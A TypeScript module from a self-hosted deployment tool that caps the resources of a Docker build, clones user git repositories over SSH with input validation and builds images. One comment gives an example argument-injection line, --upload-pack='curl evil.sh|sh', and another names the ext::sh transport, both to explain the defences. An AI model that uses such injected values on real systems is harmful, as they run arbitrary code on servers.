import {
  type ExecOptions,
  type ExecResult,
  exec,
  execArgv,
  quoteArg,
  type SshClient,
} from "@noddle/ssh-executor";

export class BuildError extends Error {
  readonly stage: string;
  readonly exitCode: number | null;

  constructor(stage: string, message: string, exitCode: number | null) {
    super(message);
    this.name = "BuildError";
    this.stage = stage;
    this.exitCode = exitCode;
  }
}

function check(stage: string, res: ExecResult): ExecResult {
  if (res.code !== 0) {
    const tail = (res.stderr || res.stdout)
      .trim()
      .split("\n")
      .slice(-8)
      .join("\n");
    throw new BuildError(
      stage,
      `${stage} failed (code ${res.code})\n${tail}`,
      res.code
    );
  }
  return res;
}

// ─────────────────────────────────────────────────────────────────────────────
// Build cap sizing
// ─────────────────────────────────────────────────────────────────────────────

export interface BuildCap {
  cpuPeriod: number;
  cpuQuota: number;
  memory: string;
}

/**
 * Derives the cap from the server's memory.
 *
 * Not TOTAL memory: under the chosen topology, Noddle also hosts its own
 * Postgres, Redis, web and worker on the same machine, plus already-deployed
 * services. A cap computed on the total would starve exactly what it is meant
 * to protect.
 *
 * The 512 MB floor is not caution: below that, an ordinary Node build fails,
 * and the user concludes Noddle is broken rather than that their machine is
 * too small.
 */
export function computeBuildCap(opts: {
  totalMemoryMb: number;
  reservedMb?: number;
  cpus?: number;
}): BuildCap {
  const reserved = opts.reservedMb ?? 768;
  const available = Math.max(opts.totalMemoryMb - reserved, 0);
  const memoryMb = Math.max(Math.floor(available * 0.75), 512);

  const cpus = opts.cpus ?? 1.5;
  return {
    cpuPeriod: 100_000,
    cpuQuota: Math.round(cpus * 100_000),
    memory: `${memoryMb}m`,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Capped builder
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Creates the buildx builder that will carry the cap.
 *
 * `docker build --memory` DOES NOT WORK: BuildKit accepts the flag and ignores
 * it (moby/buildkit#1362). A cap set there is a silent no-op — the worst case,
 * since the build succeeds and the protection appears active.
 *
 * The cgroup must therefore sit on the BUILDER. The docker-container driver
 * runs buildkitd in a container, and that container accepts
 * memory / cpu-quota / cpu-period as --driver-opt.
 */
export async function ensureCappedBuilder(
  client: SshClient,
  name: string,
  cap: BuildCap,
  opts: ExecOptions = {}
): Promise<void> {
  const exists = await exec(
    client,
    `sudo docker buildx inspect ${quoteArg(name)}`
  );
  if (exists.code === 0) {
    return;
  }
  check(
    "builder creation",
    await execArgv(
      client,
      [
        "sudo",
        "docker",
        "buildx",
        "create",
        "--name",
        name,
        "--driver",
        "docker-container",
        "--driver-opt",
        `memory=${cap.memory}`,
        "--driver-opt",
        `cpu-quota=${cap.cpuQuota}`,
        "--driver-opt",
        `cpu-period=${cap.cpuPeriod}`,
        "--bootstrap",
      ],
      opts
    )
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// ARGUMENT injection — distinct from shell injection
// ─────────────────────────────────────────────────────────────────────────────

/**
 * `quoteArg` neutralizes shell metacharacters. It does NOT protect against
 * argument injection: a value starting with `-` remains a distinct argv token
 * that the program will read as a flag.
 *
 *     git clone --upload-pack='curl evil.sh|sh' ...
 *
 * `--upload-pack` makes git execute an arbitrary command. No amount of quoting
 * changes that: the shell is not at fault.
 *
 * Two defenses, applied together:
 *   1. refuse here anything that looks like a flag (defense in depth — the
 *      engine does not trust its callers, even though @noddle/shared already
 *      validates at the HTTP boundary);
 *   2. place `--` before positionals where the command supports it.
 */
function assertNotFlag(value: string, label: string): void {
  if (value.startsWith("-")) {
    throw new BuildError(
      "validation",
      `${label} cannot start with "-": git would read it as a flag`,
      null
    );
  }
}

const SAFE_BRANCH = /^[A-Za-z0-9._/-]+$/;
const SAFE_SHA = /^[0-9a-f]{7,40}$/;
/**
 * Whitelist of git transports, not merely a refusal of flags.
 *
 * `assertNotFlag` is not enough here: `ext::sh -c <command>` is a perfectly
 * valid git transport that EXECUTES the command, and it does not start with a
 * dash. A blacklist would miss the next variant; so we enumerate what is
 * allowed.
 *
 * `file://` is admitted: inert transport, useful for a local mirror or an
 * offline install. `ext::`, `--upload-pack` and the like are outside this
 * list, hence refused.
 */
const SAFE_REPO_URL = /^(https:\/\/|ssh:\/\/|file:\/\/|git@[\w.-]+:)/;

/**
 * A working directory we are willing to ERASE.
 *
 * `fetchSource` starts with `rm -rf` on this path. It is built by the caller
 * from a base identifier — never from user input — but that is precisely the
 * kind of certainty that does not survive a refactor: an empty identifier, and
 * `/var/lib/noddle/builds/` disappears entirely. Same philosophy as
 * `assertNotFlag` just above: the engine does not trust its callers.
 *
 * At least three segments, none empty, none `..` — which rules out the root,
 * `/opt`, a trailing-slash path, and any traversal.
 */
function assertWipableDir(dir: string): void {
  const segments = dir.split("/");
  const bad =
    !dir.startsWith("/") ||
    segments.length < 4 ||
    segments.slice(1).some((s) => s === "" || s === "." || s === "..");
  if (bad) {
    throw new BuildError(
      "validation",
      `working directory refused: "${dir}" — too close to the root or malformed, and it would be erased`,
      null
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Source fetch
// ─────────────────────────────────────────────────────────────────────────────

export interface CloneOptions extends ExecOptions {
  branch: string;
  commitSha?: string;
  dir: string;
  repoUrl: string;
}

/** Returns the SHA actually built — never "the branch". */
export async function fetchSource(
  client: SshClient,
  o: CloneOptions
): Promise<string> {
  // The engine re-validates what @noddle/shared already validated on the API
  // side. One day a caller will forget, and that day it is RCE on the client's
  // server.
  assertNotFlag(o.repoUrl, "repository URL");
  assertNotFlag(o.branch, "branch name");
  assertWipableDir(o.dir);
  if (!SAFE_REPO_URL.test(o.repoUrl)) {
    throw new BuildError("validation", "repository URL refused", null);
  }
  if (!SAFE_BRANCH.test(o.branch)) {
    throw new BuildError("validation", "branch name refused", null);
  }
  if (o.commitSha && !SAFE_SHA.test(o.commitSha)) {
    throw new BuildError("validation", "commit SHA refused", null);
  }

  check(
    "directory preparation",
    await exec(
      client,
      `sudo rm -rf ${quoteArg(o.dir)} && sudo mkdir -p ${quoteArg(o.dir)} && sudo chown -R "$USER" ${quoteArg(o.dir)}`
    )
  );

  // execArgv: URL and branch come from the user. Concatenated as-is into a
  // shell string, they execute code on THEIR server.
  check(
    "git clone",
    await execArgv(
      client,
      [
        "git",
        "clone",
        "--depth",
        "1",
        "--branch",
        o.branch,
        // End of options: everything after is positional, even if it starts
        // with a dash.
        "--",
        o.repoUrl,
        o.dir,
      ],
      o
    )
  );

  if (o.commitSha) {
    check(
      "git checkout",
      await execArgv(
        client,
        ["git", "-C", o.dir, "fetch", "--depth", "1", "origin", o.commitSha],
        o
      )
    );
    check(
      "git checkout",
      await execArgv(
        client,
        // No `-- <sha>` here: in git, `checkout -- X` means "restore FILE X",
        // not "switch to commit X". `--detach` lifts the ambiguity, and the
        // SHA validation above rules out a flag.
        ["git", "-C", o.dir, "checkout", "--detach", o.commitSha],
        o
      )
    );
  }

  const rev = check(
    "git rev-parse",
    await execArgv(client, ["git", "-C", o.dir, "rev-parse", "HEAD"])
  );
  return rev.stdout.trim();
}

// ─────────────────────────────────────────────────────────────────────────────
// Build
// ─────────────────────────────────────────────────────────────────────────────

export interface BuildOptions extends ExecOptions {
  builderName: string;
  dir: string;
  imageTag: string;
}

/**
 * Nixpacks generates the Dockerfile; buildx builds it on the capped builder.
 *
 * Two traps, both paid for in Phase 0:
 *
 * 1. `--out .` and never another directory. Nixpacks writes ONLY `.nixpacks/`
 *    and does not copy sources, while the generated Dockerfile does
 *    `COPY .nixpacks/…`. Written elsewhere, the context does not contain that
 *    COPY.
 *
 * 2. NEVER `--apt` nor `--pkgs`. On nixpacks 1.41, both overwrite the nix
 *    overlays list, where the Node provider declares nix-npm-overlay — which
 *    DEFINES npm-9_x. Without it, every Node build dies on
 *    `error: undefined variable 'npm-9_x'`. There is therefore no way to inject
 *    a package via the CLI: what the image needs must come from the base image.
 */
export async function buildImage(
  client: SshClient,
  o: BuildOptions
): Promise<void> {
  check(
    "nixpacks",
    await exec(
      client,
      `cd ${quoteArg(o.dir)} && rm -rf .nixpacks && nixpacks build . --out .`,
      o
    )
  );

  check(
    "nixpacks plan check",
    await exec(client, `test -f ${quoteArg(`${o.dir}/.nixpacks/Dockerfile`)}`)
  );

  // --progress=plain: buildx's default TTY renderer rewrites the screen and is
  // unusable as an SSE stream. That is the output that goes to the dashboard.
  check(
    "docker buildx build",
    await exec(
      client,
      `cd ${quoteArg(o.dir)} && sudo docker buildx build` +
        ` --builder ${quoteArg(o.builderName)}` +
        " --progress=plain --load" +
        " -f .nixpacks/Dockerfile" +
        ` -t ${quoteArg(o.imageTag)} .`,
      o
    )
  );
}

export interface DockerfileBuildOptions extends ExecOptions {
  builderName: string;
  /** Build context root — the directory from which `COPY` resolves. */
  contextDir: string;
  /**
   * Dockerfile path, RELATIVE to `contextDir`. A Compose deploy provides its
   * own Dockerfile per service (what `build:` references in the file) — no
   * nixpacks generation here, the user already has one.
   */
  dockerfilePath: string;
  imageTag: string;
}

/**
 * Same capped builder, same `--progress=plain`, but the Dockerfile comes from
 * the user instead of being generated by nixpacks. This is the build path for
 * a Compose service: each service with a `build:` in the file goes through
 * here, one by one, before `docker stack deploy` sees the rewritten file with
 * `image:` entries instead.
 */
export async function buildImageFromDockerfile(
  client: SshClient,
  o: DockerfileBuildOptions
): Promise<void> {
  // `contextDir` and `dockerfilePath` come from a user-supplied compose file,
  // never from a code constant — same caution as at the entry of `fetchSource`.
  assertNotFlag(o.contextDir, "context directory");
  assertNotFlag(o.dockerfilePath, "Dockerfile path");
  assertNotFlag(o.imageTag, "image tag");

  check(
    "docker buildx build",
    await exec(
      client,
      `cd ${quoteArg(o.contextDir)} && sudo docker buildx build` +
        ` --builder ${quoteArg(o.builderName)}` +
        " --progress=plain --load" +
        ` -f ${quoteArg(o.dockerfilePath)}` +
        ` -t ${quoteArg(o.imageTag)} .`,
      o
    )
  );
}
